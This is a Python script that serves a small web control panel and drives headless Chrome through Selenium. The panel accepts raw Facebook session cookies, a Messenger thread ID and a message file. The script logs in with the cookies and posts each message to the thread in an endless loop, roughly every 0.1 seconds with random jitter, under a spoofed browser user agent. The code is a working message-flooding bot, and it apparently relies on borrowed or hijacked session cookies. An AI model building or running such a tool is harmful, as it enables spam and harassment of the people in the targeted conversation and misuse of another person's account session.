import time
import random
import os
import threading
import http.server
import socketserver
import json
import io
import sys
from datetime import datetime
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service

# Global state
bot_state = {
    'running': False,
    'logs': [],
    'driver': None,
    'stop_flag': False
}

class LogCapture(io.StringIO):
    def write(self, s):
        bot_state['logs'].append(s.strip())
        if len(bot_state['logs']) > 500:
            bot_state['logs'].pop(0)
        return super().write(s)

class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/get-logs':
            response = json.dumps({
                'logs': bot_state['logs'][-100:]
            }).encode()
            
            self.send_response(200)
            self.send_header("Content-type", "application/json")
            self.end_headers()
            self.wfile.write(response)
        elif self.path == '/':
            try:
                with open('index.html', 'r') as f:
                    content = f.read().encode()
                self.send_response(200)
                self.send_header("Content-type", "text/html")
                self.send_header("Cache-Control", "no-cache")
                self.end_headers()
                self.wfile.write(content)
            except:
                self.send_response(200)
                self.send_header("Content-type", "text/html")
                self.end_headers()
                self.wfile.write(b"Server is Running")
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        if self.path == '/start-bot':
            content_type = self.headers['Content-Type']
            
            if 'multipart/form-data' in content_type:
                try:
                    content_length = int(self.headers['Content-Length'])
                    body = self.rfile.read(content_length)
                    
                    boundary = content_type.split("boundary=")[1].encode()
                    parts = body.split(b'--' + boundary)
                    
                    data = {}
                    file_content = None
                    
                    for part in parts:
                        if b'Content-Disposition' in part:
                            if b'filename=' in part:
                                file_start = part.find(b'\r\n\r\n') + 4
                                file_end = part.rfind(b'\r\n')
                                file_content = part[file_start:file_end].decode('utf-8', errors='ignore')
                            else:
                                lines = part.split(b'\r\n')
                                for i, line in enumerate(lines):
                                    if b'name=' in line:
                                        name = line.decode().split('name="')[1].split('"')[0]
                                        value = lines[i+2].decode('utf-8', errors='ignore')
                                        data[name] = value
                                        break
                    
                    if file_content and data.get('threadId') and data.get('cookies'):
                        with open('File.txt', 'w') as f:
                            f.write(file_content)
                        
                        with open('convo.txt', 'w') as f:
                            f.write(data['threadId'])
                        
                        with open('cookies.txt', 'w') as f:
                            f.write(data['cookies'])
                        
                        with open('time.txt', 'w') as f:
                            f.write(data.get('interval', '0.1'))
                        
                        bot_state['stop_flag'] = False
                        bot_thread = threading.Thread(target=send_messages_main, daemon=True)
                        bot_thread.start()
                        
                        response = json.dumps({
                            'success': True,
                            'message': 'Bot started successfully!'
                        }).encode()
                    else:
                        response = json.dumps({
                            'success': False,
                            'message': 'Missing file or required fields'
                        }).encode()
                    
                    self.send_response(200)
                    self.send_header("Content-type", "application/json")
                    self.end_headers()
                    self.wfile.write(response)
                except Exception as e:
                    response = json.dumps({
                        'success': False,
                        'message': str(e)
                    }).encode()
                    
                    self.send_response(500)
                    self.send_header("Content-type", "application/json")
                    self.end_headers()
                    self.wfile.write(response)
        
        elif self.path == '/stop-bot':
            bot_state['stop_flag'] = True
            if bot_state['driver']:
                try:
                    bot_state['driver'].quit()
                except:
                    pass
                bot_state['driver'] = None
            
            response = json.dumps({
                'success': True,
                'message': 'Bot stopped'
            }).encode()
            
            self.send_response(200)
            self.send_header("Content-type", "application/json")
            self.end_headers()
            self.wfile.write(response)
        
        else:
            self.send_error(404)
    
    def log_message(self, format, *args):
        pass

def log_print(message):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_msg = f"[{timestamp}] {message}"
    print(log_msg)
    bot_state['logs'].append(log_msg)
    if len(bot_state['logs']) > 500:
        bot_state['logs'].pop(0)

def execute_server():
    PORT = int(os.getenv('PORT', 5000))
    socketserver.TCPServer.allow_reuse_address = True
    with socketserver.TCPServer(("0.0.0.0", PORT), MyHandler) as httpd:
        log_print(f"[+] Server running at http://localhost:{PORT}")
        httpd.serve_forever()

def setup_driver():
    log_print("[+] Setting up Chrome browser...")
    chrome_options = Options()
    chrome_options.add_argument('--headless')
    chrome_options.add_argument('--no-sandbox')
    chrome_options.add_argument('--disable-dev-shm-usage')
    chrome_options.add_argument('--disable-gpu')
    chrome_options.add_argument('--disable-software-rasterizer')
    chrome_options.add_argument('--window-size=1920,1080')
    chrome_options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36')
    chrome_options.add_argument('--disable-extensions')
    chrome_options.add_argument('--disable-plugins')
    chrome_options.add_argument('--disable-images')
    chrome_options.add_argument('--blink-settings=imagesEnabled=false')
    
    try:
        from webdriver_manager.chrome import ChromeDriverManager
        
        log_print("[DEBUG] Using webdriver-manager to download ChromeDriver...")
        service = Service(ChromeDriverManager().install())
        driver = webdriver.Chrome(service=service, options=chrome_options)
        
        log_print("[+] Browser setup successful")
        return driver
    except Exception as e:
        log_print(f"[ERROR] Failed to setup browser: {str(e)}")
        raise

def load_cookies_to_browser(driver):
    log_print("[+] Loading cookies into browser...")
    try:
        with open('cookies.txt', 'r') as file:
            cookies_content = file.read().strip().strip('[]')
            
        driver.get('https://www.facebook.com')
        time.sleep(2)
        
        cookie_pairs = cookies_content.split(';')
        for pair in cookie_pairs:
            pair = pair.strip()
            if '=' in pair:
                key, value = pair.split('=', 1)
                key = key.strip()
                value = value.strip()
                
                try:
                    cookie_dict = {
                        'name': key,
                        'value': value,
                        'domain': '.facebook.com'
                    }
                    driver.add_cookie(cookie_dict)
                except Exception as e:
                    log_print(f"[DEBUG] Could not add cookie {key}: {str(e)}")
        
        log_print("[+] Cookies loaded successfully")
        return True
        
    except Exception as e:
        log_print(f"[ERROR] Failed to load cookies: {str(e)}")
        return False

def send_message_selenium(driver, convo_id, message):
    if bot_state['stop_flag']:
        return False
        
    try:
        url = f'https://www.facebook.com/messages/t/{convo_id}'
        log_print(f"[DEBUG] Navigating to messenger: {url}")
        driver.get(url)
        time.sleep(2)  # Reduced from 5 seconds
        
        log_print(f"[DEBUG] Current URL: {driver.current_url}")
        log_print(f"[DEBUG] Page title: {driver.title}")
        
        if "login" in driver.current_url.lower() or "login" in driver.title.lower():
            log_print("[ERROR] Not logged in! Cookies might be expired.")
            return False
        
        wait = WebDriverWait(driver, 10)  # Reduced for faster timeout
        
        log_print("[DEBUG] Waiting for message box...")
        message_box_selectors = [
            "div[contenteditable='true']",
            "textarea[name='body']",
            "textarea#composerInput",
            "textarea",
            "input[type='text']"
        ]
        
        message_box = None
        for selector in message_box_selectors:
            try:
                log_print(f"[DEBUG] Trying selector: {selector}")
                # Wait for element to be present
                wait.until(EC.presence_of_all_elements_located((By.CSS_SELECTOR, selector)))
                
                elements = driver.find_elements(By.CSS_SELECTOR, selector)
                for elem in elements:
                    try:
                        if elem.is_displayed():
                            message_box = elem
                            log_print(f"[DEBUG] Found message box with selector: {selector}")
                            break
                    except:
                        continue
                
                if message_box:
                    break
            except Exception as e:
                log_print(f"[DEBUG] Selector {selector} not found: {str(e)}")
                continue
        
        if not message_box:
            log_print("[ERROR] Could not find message box after trying all selectors")
            return False
        
        log_print(f"[DEBUG] Typing message: {message[:50]}...")
        
        try:
            message_box.click()
            time.sleep(0.1)
            message_box.clear()
            time.sleep(0.1)
            message_box.send_keys(message)
            time.sleep(0.2)
            message_box.send_keys(Keys.ENTER)
            log_print("[+] Message sent successfully")
            time.sleep(0.5)
            return True
        except Exception as inner_e:
            log_print(f"[DEBUG] Direct send failed, trying JavaScript: {str(inner_e)}")
            try:
                driver.execute_script("""
                    var element = arguments[0];
                    element.focus();
                    element.click();
                """, message_box)
                time.sleep(0.1)
                message_box.send_keys(message)
                time.sleep(0.2)
                message_box.send_keys(Keys.ENTER)
                log_print("[+] Message sent successfully")
                time.sleep(0.5)
                return True
            except Exception as fallback_e:
                log_print(f"[ERROR] All send methods failed: {str(fallback_e)}")
                return False
        
    except Exception as e:
        log_print(f"[ERROR] Failed to send message: {str(e)}")
        return False

def send_messages_main():
    log_print("[+] Starting Selenium-based message sender...")
    
    try:
        with open('convo.txt', 'r') as file:
            convo_id = file.read().strip()
            log_print(f"[DEBUG] Conversation ID: {convo_id}")
    except Exception as e:
        log_print(f"[ERROR] Reading convo.txt: {str(e)}")
        return
    
    try:
        with open('File.txt', 'r') as file:
            messages = [line.strip() for line in file.readlines() if line.strip()]
            log_print(f"[DEBUG] Loaded {len(messages)} messages")
    except Exception as e:
        log_print(f"[ERROR] Reading messages: {str(e)}")
        return
    
    try:
        with open('time.txt', 'r') as file:
            speed = float(file.read().strip())
    except:
        speed = 0.1
    
    driver = setup_driver()
    bot_state['driver'] = driver
    
    if not load_cookies_to_browser(driver):
        log_print("[ERROR] Failed to load cookies - stopping")
        driver.quit()
        bot_state['driver'] = None
        return
    
    log_print("[+] Starting message loop...")
    try:
        while not bot_state['stop_flag']:
            try:
                for i, message in enumerate(messages):
                    if bot_state['stop_flag']:
                        break
                        
                    if send_message_selenium(driver, convo_id, message):
                        log_print(f"[+] Message {i+1}/{len(messages)} sent successfully")
                    else:
                        log_print(f"[-] Failed to send message {i+1}")
                    
                    time.sleep(max(0, speed + random.uniform(-0.5, 0.5)))
                
                if not bot_state['stop_flag']:
                    log_print("[+] Message cycle completed. Restarting...")
            except Exception as e:
                log_print(f"[!] Error in message loop: {str(e)}")
                if not bot_state['stop_flag']:
                    time.sleep(5)
    
    except KeyboardInterrupt:
        log_print("\n[+] Stopping message sender...")
    finally:
        try:
            driver.quit()
        except:
            pass
        bot_state['driver'] = None
        log_print("[+] Browser closed")

if __name__ == "__main__":
    server_thread = threading.Thread(target=execute_server, daemon=False)
    server_thread.start()
    
    time.sleep(2)
    log_print("[+] Selenium Bot Ready!")
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        pass
